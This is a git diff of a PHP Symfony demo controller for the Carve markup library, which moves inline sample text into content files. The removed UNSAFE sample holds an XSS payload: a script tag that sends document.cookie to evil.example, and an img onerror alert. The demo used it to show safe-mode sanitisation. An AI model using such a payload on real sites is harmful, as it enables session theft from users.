@@ -7,50 +7,98 @@ namespace App\Controller;
 use App\Carve\ConfigIncludeResolver;
 use App\Entity\Article;
 use App\Form\ArticleType;
-use MarkupCarve\Carve\CarveConverter as BaseCarveConverter;
-use MarkupCarve\Carve\SafeMode;
-use MarkupCarve\Carve\Transform\IncludeExpander;
+use MarkupCarve\Carve\Carve;
+use MarkupCarve\Carve\Node;
 use MarkupCarve\SymfonyCarve\CarveRenderer;
+use MarkupCarve\SymfonyCarve\CarveTools;
+use MarkupCarve\SymfonyCarve\Command\ConvertCommand;
+use MarkupCarve\SymfonyCarve\Command\FormatCommand;
+use MarkupCarve\SymfonyCarve\Command\LintCommand;
+use MarkupCarve\SymfonyCarve\Command\RenderCommand;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
+use Symfony\Component\Cache\Adapter\ArrayAdapter;
+use Symfony\Component\Console\Command\Command;
+use Symfony\Component\Console\Input\ArrayInput;
+use Symfony\Component\Console\Output\BufferedOutput;
+use Symfony\Component\DependencyInjection\Attribute\Autowire;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
 use Symfony\Component\Routing\Attribute\Route;
 
 class DemoController extends AbstractController
 {
-    private const SAMPLE = <<<'CARVE'
-        # Welcome to Carve
+    /** Syntax gallery: label => file below content/syntax. */
+    private const SYNTAX = [
+        'Headings' => 'headings',
+        'Emphasis' => 'emphasis',
+        'Superscript & subscript' => 'sup-sub',
+        'Lists' => 'lists',
+        'Task list' => 'task-list',
+        'Tight vs loose lists' => 'tight-loose',
+        'Definition list' => 'definition-list',
+        'Blockquote' => 'blockquote',
+        'Link & image' => 'link-image',
+        'Table' => 'table',
+        'Table alignment' => 'table-alignment',
+        'Table spans and continuation rows' => 'table-spans',
+        'Admonition' => 'admonition',
+        'Footnotes' => 'footnotes',
+        'Smart typography' => 'smart-typography',
+        'Comment lines' => 'comment-lines',
+        'Comment line in a list' => 'comment-in-list',
+        'Escaped block markers' => 'escaped-markers',
+        'Blocks inside list items' => 'list-item-blocks',
+        'CSV and TSV tables' => 'csv-tsv',
+    ];
 
-        This is a paragraph with /italic/, *bold*, and _underline_ text.
+    private const DIAGRAMS = [
+        'Mermaid' => [
+            'file' => 'mermaid',
+            'renderer' => 'mermaid.js (CDN, client-side)',
+            'note' => 'Rendered live by mermaid.js. The library loads from a CDN and draws entirely in the browser.',
+        ],
+        'Graphviz' => [
+            'file' => 'graphviz',
+            'renderer' => '@viz-js/viz WebAssembly (CDN, offline after load)',
+            'note' => 'The dot source is rendered to SVG fully in-browser by the @viz-js/viz WebAssembly build. No server call.',
+        ],
+        'D2' => [
+            'file' => 'd2',
+            'renderer' => 'Kroki server (public kroki.io, needs network)',
+            'note' => 'D2 has no small in-browser build, so the source is deflate-encoded and drawn through the public Kroki server. If the network is blocked the source stays visible.',
+        ],
+        'PlantUML' => [
+            'file' => 'plantuml',
+            'renderer' => 'plantuml.com server (~h hex encoding, needs network)',
+            'note' => 'The source is hex-encoded and drawn by the public PlantUML server via its ~h scheme. If the network is blocked the source stays visible.',
+        ],
+        'Vega-Lite' => [
+            'file' => 'vega-lite',
+            'renderer' => 'vega + vega-lite + vega-embed (CDN, client-side)',
+            'note' => 'A Vega-Lite JSON spec drawn by vega-embed. The fence word is vega-lite (hyphen); the config enum spells it vega_lite.',
+        ],
+        'WaveDrom' => [
+            'file' => 'wavedrom',
+            'renderer' => 'wavedrom + default skin (CDN, client-side)',
+            'note' => 'A WaveDrom JSON timing spec, drawn to SVG by the wavedrom library.',
+        ],
+        'Chart.js' => [
+            'file' => 'chart',
+            'renderer' => 'chart.js (CDN, client-side)',
+            'note' => 'A Chart.js JSON config, drawn onto a <canvas> by chart.js.',
+        ],
+        'ABC' => [
+            'file' => 'abc',
+            'renderer' => 'abcjs (CDN, client-side)',
+            'note' => 'ABC music notation rendered to a score (SVG) by abcjs.',
+        ],
+    ];
 
-        ## Features
-
-        - Clean, consistent syntax
-        - [x] Task lists work
-        - [ ] Even unchecked ones
-
-        > Carve is a lightweight markup language for structured documents, with clear, consistent syntax.
-
-        ### Code
-
-        ``` php
-        $html = (new CarveConverter())->convert('Hello *world*');
-        ```
-
-        Visit [the spec](https://github.com/markup-carve/carve) for the details.
-        CARVE;
-
-    private const UNSAFE = <<<'CARVE'
-        # User Post
-
-        Normal content here.
-
-        <script>document.location='https://evil.example/?c='+document.cookie</script>
-
-        <img src="x" onerror="alert('xss')">
-
-        More normal content.
-        CARVE;
+    public function __construct(
+        #[Autowire('%kernel.project_dir%')]
+        private readonly string $projectDir,
+    ) {
+    }
 
     #[Route('/', name: 'home')]
     public function index(): Response
@@ -62,7 +110,7 @@ class DemoController extends AbstractController
     public function twigFilter(): Response
     {
         return $this->render('demo/twig_filter.html.twig', [
-            'source' => self::SAMPLE,
+            'source' => $this->source('samples/welcome.crv'),
         ]);
     }
 
@@ -70,70 +118,190 @@ class DemoController extends AbstractController
     public function twigFunction(): Response
     {
         return $this->render('demo/twig_function.html.twig', [
-            'source' => self::SAMPLE,
+            'source' => $this->source('samples/welcome.crv'),
+            'file_source' => $this->source('parts/checklist.crv'),
+        ]);
+    }
+
+    #[Route('/twig-tools', name: 'twig_tools')]
+    public function twigTools(): Response
+    {
+        return $this->render('demo/twig_tools.html.twig', [
+            'article' => $this->source('samples/article.crv'),
+            'unformatted' => $this->source('samples/unformatted.crv'),
+            'lint_source' => $this->source('samples/lint-findings.crv'),
         ]);
     }
 
     #[Route('/service', name: 'service')]
     public function service(CarveRenderer $carve): Response
     {
+        $source = $this->source('samples/welcome.crv');
+        $article = $this->source('samples/article.crv');
+        $result = $carve->renderResult($article);
+
         return $this->render('demo/service.html.twig', [
-            'source' => self::SAMPLE,
-            'html' => $carve->render(self::SAMPLE),
+            'source' => $source,
+            'html' => $carve->render($source),
+            'article' => $article,
+            'result' => $result,
+            'tree' => $this->outline($carve->parse($source)),
+            'static_html' => $carve->withOptions(['sections' => false, 'heading_ids' => 'lower'])->render("= Hello *world*\n"),
         ]);
+    }
+
+    #[Route('/tools', name: 'tools')]
+    public function tools(CarveTools $tools): Response
+    {
+        $unformatted = $this->source('samples/unformatted.crv');
+        $lintSource = $this->source('samples/lint-findings.crv');
+        $imports = [];
+        foreach (['html' => 'import/page.html', 'gfm' => 'import/legacy.md', 'djot' => 'import/note.djot'] as $from => $file) {
+            $input = $this->source($file);
+            $imports[$from] = ['input' => $input, 'carve' => $tools->import($input, $from)];
+        }
+
+        return $this->render('demo/tools.html.twig', [
+            'unformatted' => $unformatted,
+            'formatted' => $tools->format($unformatted),
+            'aligned' => $tools->format($unformatted, alignTables: true),
+            'is_formatted_before' => $tools->isFormatted($unformatted),
+            'is_formatted_after' => $tools->isFormatted($tools->format($unformatted)),
+            'lint_source' => $lintSource,
+            'findings' => $tools->lint($lintSource),
+            'include_findings' => $tools->lint($this->source('broken.crv'), $this->contentDir(), 'broken.crv'),
+            'imports' => $imports,
+            'from_html' => $tools->fromHtml('<h2>Hi</h2><p>An <em>imported</em> paragraph.</p>'),
+            'from_markdown' => $tools->fromMarkdown("## Hi\n\nA **Markdown** paragraph.\n"),
+            'from_djot' => $tools->fromDjot("## Hi\n\nA _Djot_ paragraph.\n"),
+        ]);
+    }
+
+    #[Route('/console', name: 'console')]
+    public function console(CarveRenderer $carve, CarveTools $tools): Response
+    {
+        $runs = [
+            'carve:render content/samples/release-notes.crv' => [new RenderCommand($carve), ['path' => 'content/samples/release-notes.crv']],
+            'carve:render content/samples/release-notes.crv --format=text' => [new RenderCommand($carve), ['path' => 'content/samples/release-notes.crv', '--format' => 'text']],
+            'carve:render content/samples/release-notes.crv --format=markdown --preset=comment' => [new RenderCommand($carve), ['path' => 'content/samples/release-notes.crv', '--format' => 'markdown', '--preset' => 'comment']],
+            'carve:fmt content/samples/unformatted.crv --align-tables' => [new FormatCommand($tools), ['paths' => ['content/samples/unformatted.crv'], '--align-tables' => true]],
+            'carve:fmt --check content/syntax' => [new FormatCommand($tools), ['paths' => ['content/syntax'], '--check' => true]],
+            'carve:lint content/samples/lint-findings.crv' => [new LintCommand($tools), ['paths' => ['content/samples/lint-findings.crv']]],
+            'carve:lint content/broken.crv --include-root=content' => [new LintCommand($tools), ['paths' => ['content/broken.crv'], '--include-root' => 'content']],
+            'carve:convert content/import/legacy.md' => [new ConvertCommand($tools), ['path' => 'content/import/legacy.md']],
+            'carve:convert content/import/page.html' => [new ConvertCommand($tools), ['path' => 'content/import/page.html']],
+            'carve:convert content/import/note.djot --from=djot' => [new ConvertCommand($tools), ['path' => 'content/import/note.djot', '--from' => 'djot']],
+        ];
+
+        $results = [];
+        foreach ($runs as $label => [$command, $arguments]) {
+            $results[$label] = $this->runCommand($command, $arguments);
+        }
+
+        return $this->render('demo/console.html.twig', ['runs' => $results]);
     }
 
     #[Route('/includes', name: 'includes')]
     public function includes(CarveRenderer $carve, ConfigIncludeResolver $snippetResolver): Response
     {
-        $path = dirname(__DIR__, 2) . '/content/main.crv';
+        $path = $this->contentDir().'/main.crv';
         $fileReport = $carve->renderFileWithReport($path);
-        $dynamicSource = <<<'CARVE'
-            # Account overview
+        $brokenReport = $carve->renderFileWithReport($this->contentDir().'/broken.crv');
 
-            {{ account-status }}
-
-            {{ support-hours }}
-            CARVE;
-        $converter = new BaseCarveConverter(safeMode: true);
-        $expander = new IncludeExpander(
-            resolver: $snippetResolver,
-            currentPath: 'config:account-overview',
-            source: $dynamicSource,
-            extensions: $converter->getExtensions(),
-        );
-        $dynamicDocument = $converter->transform($converter->parse($dynamicSource), $expander);
+        // A host resolver goes straight to the engine; the bundle's own include path is the file resolver.
+        $dynamicSource = $this->source('samples/account-overview.crv');
+        $includes = ['resolver' => $snippetResolver];
+        $dynamic = Carve::renderWithDiagnostics($dynamicSource, ['includes' => $includes]);
 
         return $this->render('demo/file_includes.html.twig', [
-            'file_source' => (string) file_get_contents($path),
+            'include_root' => substr((string) $carve->getIncludeRoot(), strlen($this->projectDir) + 1),
+            'file_source' => $this->source('main.crv'),
             'file_html' => $fileReport['value'],
             'file_dependencies' => $fileReport['dependencies'],
             'file_warnings' => $fileReport['warnings'],
+            'file_text' => $carve->renderFileAs($path, 'text'),
+            'broken_source' => $this->source('broken.crv'),
+            'broken_html' => $brokenReport['value'],
+            'broken_dependencies' => $brokenReport['dependencies'],
+            'broken_warnings' => $brokenReport['warnings'],
             'dynamic_source' => $dynamicSource,
-            'dynamic_html' => $converter->render($dynamicDocument),
-            'dynamic_dependencies' => $expander->getDependencies(),
-            'dynamic_warnings' => $expander->getWarnings(),
+            'dynamic_html' => $dynamic->html,
+            'dynamic_dependencies' => Carve::includeDependencies($dynamicSource, ['includes' => $includes]),
+            'dynamic_warnings' => array_map(static fn ($diagnostic): string => $diagnostic->message, $dynamic->diagnostics),
         ]);
     }
 
     #[Route('/outputs-profiles', name: 'outputs_profiles')]
     public function outputsProfiles(CarveRenderer $carve): Response
     {
-        $source = <<<'CARVE'
-            # Release notes
-
-            Carve /renders/ to *HTML*, plain text, and Markdown from one source.
-
-            ![A diagram](/diagram.svg)
-            CARVE;
-        $comment = new CarveRenderer(profile: 'comment');
+        $source = $this->source('samples/release-notes.crv');
+        $profiles = [];
+        foreach (['full', 'article', 'comment', 'minimal'] as $profile) {
+            $profiles[$profile] = $carve->withOptions(['profile' => $profile])->render($source);
+        }
 
         return $this->render('demo/outputs_profiles.html.twig', [
             'source' => $source,
             'html' => $carve->render($source),
             'text' => $carve->renderText($source),
             'markdown' => $carve->renderMarkdown($source),
-            'comment_html' => $comment->render($source),
+            'ansi' => $this->ansiToHtml($carve->renderAnsi($source)),
+            'file_markdown' => $carve->renderFileAs($this->contentDir().'/samples/release-notes.crv', 'markdown'),
+            'profiles' => $profiles,
+            'comment_html' => (new CarveRenderer(profile: 'comment'))->render($source),
+        ]);
+    }
+
+    #[Route('/options', name: 'options')]
+    public function options(CarveRenderer $carve): Response
+    {
+        $source = $this->source('samples/options.crv');
+        $variants = [
+            'Configured defaults' => [[], 'The service as configured in config/packages/carve.yaml.'],
+            "heading_ids: 'ascii-lower'" => [['heading_ids' => 'ascii-lower'], 'Lowercase ASCII heading ids.'],
+            "heading_ids: 'off'" => [['heading_ids' => 'off'], 'No generated heading ids.'],
+            'sections: false' => [['sections' => false], 'Headings without section wrappers; the id moves onto the heading.'],
+            'source_lines: true' => [['source_lines' => true], 'Each block carries data-source-line.'],
+            'smart_typography: false' => [['smart_typography' => false], 'Quotes, dashes and ellipsis stay as typed.'],
+            "soft_break_mode: 'br'" => [['soft_break_mode' => 'br'], 'A line break inside a paragraph renders as <br>.'],
+            "mode: 'static'" => [['mode' => 'static'], 'Static output for pages without scripts.'],
+            "profile: 'minimal'" => [['profile' => 'minimal'], 'The smallest profile; headings and admonitions fall back to text.'],
+        ];
+        $rendered = [];
+        foreach ($variants as $label => [$options, $note]) {
+            $rendered[$label] = ['options' => $options, 'note' => $note, 'html' => $carve->withOptions($options)->render($source)];
+        }
+
+        $labelled = new CarveRenderer(labels: ['admonitionNote' => 'Hinweis'], symbols: ['carve' => '🪶', 'tm' => '™']);
+        $noSymbols = new CarveRenderer();
+
+        $pool = new ArrayAdapter();
+        $cached = new CarveRenderer(cache: $pool, cacheTtl: 60, cachePrefix: 'demo');
+        $first = $cached->render($source);
+        $second = $cached->render($source);
+
+        return $this->render('demo/options.html.twig', [
+            'source' => $source,
+            'variants' => $rendered,
+            'labels_html' => $labelled->render($source),
+            'no_symbols_html' => $noSymbols->render($source),
+            'cache_keys' => array_keys($pool->getValues()),
+            'cache_same' => $first === $second,
+        ]);
+    }
+
+    #[Route('/extensions', name: 'extensions')]
+    public function extensions(CarveRenderer $carve): Response
+    {
+        $source = $this->source('samples/extensions.crv');
+        $permalinks = new CarveRenderer(extensions: [['type' => 'heading_permalinks', 'symbol' => '#'], 'autolink']);
+
+        return $this->render('demo/extensions.html.twig', [
+            'source' => $source,
+            'html' => $carve->render($source),
+            'static_html' => $carve->withOptions(['mode' => 'static'])->render($source),
+            'plain_html' => (new CarveRenderer())->render($source),
+            'permalinks_html' => $permalinks->render($source),
         ]);
     }
 
@@ -141,7 +309,7 @@ class DemoController extends AbstractController
     public function form(Request $request, CarveRenderer $carve): Response
     {
         $article = new Article();
-        $article->setBody(self::SAMPLE);
+        $article->setBody($this->source('samples/welcome.crv'));
 
         $form = $this->createForm(ArticleType::class, $article);
         $form->handleRequest($request);
@@ -152,7 +320,7 @@ class DemoController extends AbstractController
                 'title' => $article->getTitle(),
                 'body_html' => $carve->render($article->getBody()),
                 'comment_html' => $article->getComment() !== null && $article->getComment() !== ''
-                    ? $carve->render($article->getComment())
+                    ? $carve->withOptions(['profile' => 'comment'])->render($article->getComment())
                     : null,
             ];
         }
@@ -164,151 +332,116 @@ class DemoController extends AbstractController
     }
 
     #[Route('/safe-mode', name: 'safe_mode')]
-    public function safeMode(): Response
+    public function safeMode(CarveRenderer $carve): Response
     {
+        $source = $this->source('samples/untrusted.crv');
+
         return $this->render('demo/safe_mode.html.twig', [
-            'source' => self::UNSAFE,
-            'strip' => (new CarveRenderer(true, SafeMode::RAW_HTML_STRIP))->render(self::UNSAFE),
-            'escape' => (new CarveRenderer(true, SafeMode::RAW_HTML_ESCAPE))->render(self::UNSAFE),
-            'allow' => (new CarveRenderer(true, SafeMode::RAW_HTML_ALLOW))->render(self::UNSAFE),
-            'disabled' => (new CarveRenderer(false))->render(self::UNSAFE),
+            'source' => $source,
+            'escaped' => $carve->render($source),
+            'trusted' => $carve->withOptions(['raw_html' => true])->render($source),
+            'https_only' => $carve->withOptions(['url_policy' => ['allow' => ['https']]])->render($source),
         ]);
     }
 
     #[Route('/diagrams', name: 'diagrams')]
     public function diagrams(CarveRenderer $carve): Response
     {
-        // The injected CarveRenderer is configured from config/packages/carve.yaml,
-        // where all eight presets are enabled. With a preset enabled, a matching
-        // fence renders as a hydration element (e.g. <pre class="mermaid">...)
-        // instead of a plain code block. Each example below carries a fence CSS
-        // class, a note on how it draws, and valid source so the client-side
-        // library on the page can actually render it.
-        $examples = [
-            'Mermaid' => [
-                'class' => 'mermaid',
-                'renderer' => 'mermaid.js (CDN, client-side)',
-                'note' => 'Rendered live by mermaid.js. The library loads from a CDN and draws entirely in the browser.',
-                'source' => "``` mermaid\nflowchart LR\n    A[Write Carve] --> B{diagrams enabled?}\n    B -->|yes| C[hydration element]\n    B -->|no| D[plain code block]\n```",
-            ],
-            'Graphviz' => [
-                'class' => 'graphviz',
-                'renderer' => '@viz-js/viz WebAssembly (CDN, offline after load)',
-                'note' => 'The dot source is rendered to SVG fully in-browser by the @viz-js/viz WebAssembly build. No server call.',
-                'source' => "``` dot\ndigraph {\n    rankdir=LR;\n    Carve -> HTML -> Diagram;\n}\n```",
-            ],
-            'D2' => [
-                'class' => 'd2',
-                'renderer' => 'Kroki server (public kroki.io, needs network)',
-                'note' => 'D2 has no small in-browser build, so the source is deflate-encoded and drawn through the public Kroki server. If the network is blocked the source stays visible.',
-                'source' => "``` d2\nCarve -> HTML: convert\nHTML -> Diagram: hydrate\n```",
-            ],
-            'PlantUML' => [
-                'class' => 'plantuml',
-                'renderer' => 'plantuml.com server (~h hex encoding, needs network)',
-                'note' => 'The source is hex-encoded and drawn by the public PlantUML server via its ~h scheme. If the network is blocked the source stays visible.',
-                'source' => "``` plantuml\n@startuml\nAlice -> Bob: config option\nBob --> Alice: hydration markup\n@enduml\n```",
-            ],
-            'Vega-Lite' => [
-                'class' => 'vega-lite',
-                'renderer' => 'vega + vega-lite + vega-embed (CDN, client-side)',
-                'note' => 'A Vega-Lite JSON spec rides in a <script type="application/json"> and is drawn by vega-embed. Note the fence word is vega-lite (hyphen); the config enum spells it vega_lite.',
-                'source' => "``` vega-lite\n{\n  \"\$schema\": \"https://vega.github.io/schema/vega-lite/v5.json\",\n  \"data\": {\"values\": [\n    {\"engine\": \"PHP\", \"tier\": 3},\n    {\"engine\": \"JS\", \"tier\": 3},\n    {\"engine\": \"Rust\", \"tier\": 3}\n  ]},\n  \"mark\": \"bar\",\n  \"encoding\": {\n    \"x\": {\"field\": \"engine\", \"type\": \"nominal\"},\n    \"y\": {\"field\": \"tier\", \"type\": \"quantitative\"}\n  }\n}\n```",
-            ],
-            'WaveDrom' => [
-                'class' => 'wavedrom',
-                'renderer' => 'wavedrom + default skin (CDN, client-side)',
-                'note' => 'A WaveDrom JSON timing spec, drawn to SVG by the wavedrom library.',
-                'source' => "``` wavedrom\n{ \"signal\": [\n  { \"name\": \"clk\",  \"wave\": \"p......\" },\n  { \"name\": \"data\", \"wave\": \"x.34.5x\", \"data\": [\"a\", \"b\", \"c\"] }\n]}\n```",
-            ],
-            'Chart.js' => [
-                'class' => 'chart',
-                'renderer' => 'chart.js (CDN, client-side)',
-                'note' => 'A Chart.js JSON config in a <script type="application/json">, drawn onto a <canvas> by chart.js.',
-                'source' => "``` chart\n{\n  \"type\": \"bar\",\n  \"data\": {\n    \"labels\": [\"PHP\", \"JS\", \"Rust\"],\n    \"datasets\": [{ \"label\": \"Carve engines\", \"data\": [3, 3, 3] }]\n  },\n  \"options\": { \"responsive\": true }\n}\n```",
-            ],
-            'ABC' => [
-                'class' => 'abc',
-                'renderer' => 'abcjs (CDN, client-side)',
-                'note' => 'ABC music notation rendered to a score (SVG) by abcjs.',
-                'source' => "``` abc\nX:1\nT:Carve Scale\nM:4/4\nL:1/4\nK:C\nC D E F | G A B c |\n```",
-            ],
-        ];
-
         $rendered = [];
-        foreach ($examples as $label => $example) {
+        foreach (self::DIAGRAMS as $label => $example) {
+            $source = $this->source('diagrams/'.$example['file'].'.crv');
             $rendered[$label] = [
-                'class' => $example['class'],
                 'renderer' => $example['renderer'],
                 'note' => $example['note'],
-                'source' => $example['source'],
-                'html' => $carve->render($example['source']),
+                'source' => $source,
+                'html' => $carve->render($source),
             ];
         }
 
-        // Contrast: the same mermaid fence with diagrams turned off stays a plain,
-        // escaped code block - the "before" side of the feature.
-        $plainConverter = new CarveRenderer(true, SafeMode::RAW_HTML_STRIP, []);
-
         return $this->render('demo/diagrams.html.twig', [
             'examples' => $rendered,
-            'disabled_html' => $plainConverter->render($examples['Mermaid']['source']),
+            'disabled_html' => (new CarveRenderer())->render($rendered['Mermaid']['source']),
         ]);
     }
 
     #[Route('/syntax', name: 'syntax')]
     public function syntax(CarveRenderer $carve): Response
     {
-        // Core constructs plus the newer / convergence features Carve is known
-        // for. Each renders live through the same CarveRenderer service.
-        $examples = [
-            'Headings' => "# Heading 1\n\n## Heading 2\n\n### Heading 3",
-            'Emphasis' => "/italic/\n\n*bold*\n\n_underline_\n\n=highlight=\n\n~strikethrough~",
-            'Superscript & subscript' => "Braced only: E = mc{^2^} and H{,2,}O.",
-            'Lists' => "- one\n- two\n  - nested\n\n. first\n. second",
-            'Task list' => "- [x] done\n- [ ] todo",
-            'Tight vs loose lists' => "Tight (no blank lines):\n\n- one\n- two\n\nLoose (blank lines between items wrap each in a paragraph):\n\n- one\n\n- two",
-            'Definition list' => ":: Carve\n: A post-Markdown markup language.\n:: Djot\n: The project Carve refines.",
-            'Blockquote' => "> A quote\n> spanning lines.",
-            'Link & image' => "[Carve spec](https://github.com/markup-carve/carve)\n\n![Demo diagram](/diagram.svg)",
-            'Table' => "|= Lang |= Status |\n| PHP | ready |\n| JS | ready |",
-            'Table alignment' => "|={<} Item |={~} Note |={>} Qty |\n| Apple | fresh | 12 |\n| Pear | ripe | 3 |",
-            'Table spans and continuation rows' => "|= Fruit |= Variety |={>} Price |\n| Apple | Gala | 1.20 |\n| ^ | Fuji | 1.40 |\n| Pear | Conference | 0.90 |\n+ | | per kilo |\n| Three varieties in stock | < | < |",
-            'Admonition' => "::: note\nThis is a note admonition.\n:::",
-            'Footnotes' => "Carve supports real footnotes.[^spec]\n\n[^spec]: Defined once, linked and back-linked automatically.",
-            'Smart typography' => "Ranges use -- an en dash -- and asides use --- an em dash. Ellipsis... and \"smart quotes\" and 'single' too.",
-            'Comment lines' => "A paragraph keeps going\n%% A reviewer note, erased before layout.\nacross the comment line.",
-            'Comment line in a list' => "- one\n%% A reviewer note between items.\n- two\n- three",
-            'Escaped block markers' => "A paragraph.\n\n\\# This stays literal text, not a heading.\n\n# A real heading",
-            'Continuation marker' => "- Install the bundle\n+\n> Run composer from the project root.\n- Register the bundle",
-            'CSV and TSV tables' => "{table}\n```csv\nItem,Qty,Note\nApple,12,fresh\n\"Pear, green\",3,ripe\n```\n\n{table}\n```tsv\nLang\tStatus\nPHP\tready\n```",
-        ];
-        // The canonical writer spells a + attachment as indentation instead.
-        $nonCanonical = ['Continuation marker' => true];
-
         $rendered = [];
-        foreach ($examples as $label => $src) {
-            if (!isset($nonCanonical[$label]) && BaseCarveConverter::toCarve($src) !== $src."\n") {
-                throw new \LogicException("Syntax example is not canonical: {$label}");
-            }
-            $rendered[$label] = ['source' => $src, 'html' => $carve->render($src)];
+        foreach (self::SYNTAX as $label => $file) {
+            $source = $this->source('syntax/'.$file.'.crv');
+            $rendered[$label] = ['source' => $source, 'html' => $carve->render($source)];
         }
-
-        // Inline literal is a distinct, newer inline construct worth its own
-        // side-by-side contrast with a normal code span.
-        $inlineLiteral = [
-            'source' => "A code span styles its content: `*not bold*`.\n\nAn inline literal shows the characters verbatim, with no code styling and no markup: !`*not bold*`.",
-            'html' => $carve->render(
-                "A code span styles its content: `*not bold*`.\n\nAn inline literal shows the characters verbatim, with no code styling and no markup: !`*not bold*`.",
-            ),
-        ];
-        if (BaseCarveConverter::toCarve($inlineLiteral['source']) !== $inlineLiteral['source']."\n") {
-            throw new \LogicException('Inline literal example is not canonical.');
-        }
+        $literal = $this->source('syntax/inline-literal.crv');
 
         return $this->render('demo/syntax.html.twig', [
             'examples' => $rendered,
-            'inline_literal' => $inlineLiteral,
+            'inline_literal' => ['source' => $literal, 'html' => $carve->render($literal)],
         ]);
+    }
+
+    private function contentDir(): string
+    {
+        return $this->projectDir.'/content';
+    }
+
+    private function source(string $file): string
+    {
+        return (string) file_get_contents($this->contentDir().'/'.$file);
+    }
+
+    /**
+     * @param array<string, mixed> $arguments
+     *
+     * @return array{exit: int, output: string}
+     */
+    private function runCommand(Command $command, array $arguments): array
+    {
+        $cwd = (string) getcwd();
+        chdir($this->projectDir);
+        try {
+            $input = new ArrayInput($arguments, $command->getDefinition());
+            $output = new BufferedOutput();
+            $exit = $command->run($input, $output);
+        } finally {
+            chdir($cwd);
+        }
+
+        return ['exit' => $exit, 'output' => str_replace($this->projectDir.'/', '', $output->fetch())];
+    }
+
+    /** @return list<string> */
+    private function outline(Node $node, int $depth = 0): array
+    {
+        $lines = [str_repeat('  ', $depth).$node->type];
+        foreach ($node->children ?? [] as $child) {
+            $lines = [...$lines, ...$this->outline($child, $depth + 1)];
+        }
+
+        return $lines;
+    }
+
+    /** Turns the ANSI writer's SGR codes into spans so the page can show the terminal output. */
+    private function ansiToHtml(string $ansi): string
+    {
+        $styles = ['1' => 'font-weight:bold', '3' => 'font-style:italic', '4' => 'text-decoration:underline', '95' => 'color:#d67ae8', '96' => 'color:#5fd7d7', '2' => 'opacity:.7'];
+        $open = 0;
+        $html = preg_replace_callback('/\e\[([0-9;]*)m/', static function (array $match) use ($styles, &$open): string {
+            if ($match[1] === '0' || $match[1] === '') {
+                $close = str_repeat('</span>', $open);
+                $open = 0;
+
+                return $close;
+            }
+            $css = [];
+            foreach (explode(';', $match[1]) as $code) {
+                $css[] = $styles[$code] ?? '';
+            }
+            ++$open;
+
+            return '<span style="'.implode(';', array_filter($css)).'">';
+        }, htmlspecialchars($ansi, ENT_QUOTES));
+
+        return (string) $html.str_repeat('</span>', $open);
     }
 }
